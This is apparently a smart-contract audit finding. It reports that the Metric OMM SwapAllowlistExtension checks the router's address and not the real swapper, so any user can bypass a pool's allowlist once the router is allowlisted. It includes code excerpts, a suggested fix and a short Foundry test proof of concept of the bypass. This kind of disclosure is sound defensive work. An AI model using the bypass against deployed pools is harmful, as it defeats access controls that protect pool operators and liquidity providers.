### Title
`SwapAllowlistExtension` Checks Router Address Instead of Actual Swapper, Enabling Full Allowlist Bypass via `MetricOmmSimpleRouter` — (`metric-periphery/contracts/extensions/SwapAllowlistExtension.sol`)

---

### Summary

`SwapAllowlistExtension.beforeSwap` gates swaps on the `sender` argument, which the pool sets to `msg.sender` of `pool.swap()`. When a user routes through `MetricOmmSimpleRouter`, `msg.sender` to the pool is the **router contract**, not the end user. If the pool admin allowlists the router address (a natural configuration choice to enable router-mediated swaps for permitted users), every public user can bypass the per-user allowlist by calling the router.

---

### Finding Description

**`SwapAllowlistExtension.beforeSwap`** checks the `sender` parameter:

```solidity
// metric-periphery/contracts/extensions/SwapAllowlistExtension.sol:31-41
function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
}
```

`msg.sender` here is the pool (the pool calls the extension). `sender` is what the pool passes as the first argument to `_beforeSwap`.

**`MetricOmmPool.swap`** always passes `msg.sender` as `sender`:

```solidity
// metric-core/contracts/MetricOmmPool.sol:230-240
_beforeSwap(
    msg.sender,   // ← always the direct caller of pool.swap()
    recipient,
    zeroForOne,
    amountSpecified,
    priceLimitX64,
    packedSlot0Initial,
    bidPriceX64,
    askPriceX64,
    extensionData
);
```

**`MetricOmmSimpleRouter.exactInputSingle`** calls `pool.swap()` directly:

```solidity
// metric-periphery/contracts/MetricOmmSimpleRouter.sol:72-80
(int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
    .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
    );
```

When a user calls `exactInputSingle`, the pool receives `msg.sender = router_address`. The extension then evaluates `allowedSwapper[pool][router_address]`, not `allowedSwapper[pool][actual_user]`.

**The bypass path:**

1. Pool admin deploys a pool with `SwapAllowlistExtension` to restrict swaps to KYC'd users.
2. Pool admin allowlists the router address so that permitted users can enjoy router UX (slippage protection, multi-hop, etc.).
3. Any unpermitted user calls `MetricOmmSimpleRouter.exactInputSingle(pool, ...)`.
4. The pool passes `sender = router_address` to the extension.
5. The extension finds `allowedSwapper[pool][router] == true` and passes.
6. The unpermitted user's swap executes successfully — the allowlist is fully bypassed.

The same bypass applies to `exactInput`, `exactOutputSingle`, and `exactOutput` on the router, and to `simulateSwapAndRevert` on the pool (which also calls `_beforeSwap`).

---

### Impact Explanation

The `SwapAllowlistExtension` is the sole on-chain mechanism for restricting who may trade in a pool. When the router is allowlisted, the guard collapses to "anyone who can call the router" — i.e., the entire public. Restricted pools (e.g., permissioned institutional venues, KYC-gated pools, or pools with regulatory constraints) lose their access control entirely. Unauthorized users can execute swaps, receive output tokens, and drain LP value through arbitrage or directional trading that the allowlist was designed to prevent.

---

### Likelihood Explanation

The scenario is highly realistic. A pool admin who wants to allow permitted users to benefit from router features (deadline checks, slippage bounds, multi-hop) will naturally allowlist the router. The `SwapAllowlistExtension` provides no mechanism to simultaneously allowlist the router and restrict individual users through it. The admin has no safe configuration that achieves both goals, making the bypass reachable through ordinary, well-intentioned admin actions.

---

### Recommendation

The extension must check the **actual end user**, not the intermediary. Two complementary fixes:

1. **Pass the real user through `extensionData`**: The router encodes `msg.sender` into `extensionData` and the extension decodes and verifies it. This requires a trusted encoding convention.

2. **Check `sender` only when it is not a known router; otherwise decode the real user from `extensionData`**: The extension can maintain a registry of trusted routers and require them to attest the real user.

3. **Alternatively, remove router allowlisting and require users to call the pool directly** when the allowlist is active — but this breaks UX.

The cleanest fix is for the router to forward the originating user's address in `extensionData` and for the extension to verify it:

```solidity
// In SwapAllowlistExtension.beforeSwap:
address effectiveSender = sender;
if (isKnownRouter[sender] && extensionData.length >= 20) {
    effectiveSender = abi.decode(extensionData, (address));
}
if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][effectiveSender]) {
    revert IMetricOmmPoolActions.NotAllowedToSwap();
}
```

---

### Proof of Concept

```solidity
// Setup: pool with SwapAllowlistExtension; only `permittedUser` is allowlisted.
// Pool admin also allowlists the router so permittedUser can use it.
extension.setAllowedToSwap(pool, permittedUser, true);
extension.setAllowedToSwap(pool, address(router), true); // natural admin action

// Attack: unpermittedUser bypasses the allowlist via the router.
vm.startPrank(unpermittedUser);
token0.approve(address(router), type(uint256).max);

// Direct pool.swap() would revert: allowedSwapper[pool][unpermittedUser] == false
vm.expectRevert(IMetricOmmPoolActions.NotAllowedToSwap.selector);
pool.swap(unpermittedUser, true, 1000, type(uint128).max, "", "");

// Router call succeeds: allowedSwapper[pool][router] == true
// Extension sees sender = router, not unpermittedUser
router.exactInputSingle(ExactInputSingleParams({
    pool: address(pool),
    recipient: unpermittedUser,
    tokenIn: token0,
    zeroForOne: true,
    amountIn: 1000,
    amountOutMinimum: 0,
    priceLimitX64: 0,
    deadline: block.timestamp + 1,
    extensionData: ""
}));
// ✓ swap succeeds — allowlist bypassed
vm.stopPrank();
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L230-240)
```text
    _beforeSwap(
      msg.sender,
      recipient,
      zeroForOne,
      amountSpecified,
      priceLimitX64,
      packedSlot0Initial,
      bidPriceX64,
      askPriceX64,
      extensionData
    );
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-core/contracts/ExtensionCalling.sol (L149-177)
```text
  function _beforeSwap(
    address sender,
    address recipient,
    bool zeroForOne,
    int128 amountSpecified,
    uint128 priceLimitX64,
    uint256 packedSlot0Initial,
    uint128 bidPriceX64,
    uint128 askPriceX64,
    bytes calldata extensionData
  ) internal {
    _callExtensionsInOrder(
      BEFORE_SWAP_ORDER,
      abi.encodeCall(
        IMetricOmmExtensions.beforeSwap,
        (
          sender,
          recipient,
          zeroForOne,
          amountSpecified,
          priceLimitX64,
          packedSlot0Initial,
          bidPriceX64,
          askPriceX64,
          extensionData
        )
      )
    );
  }
```
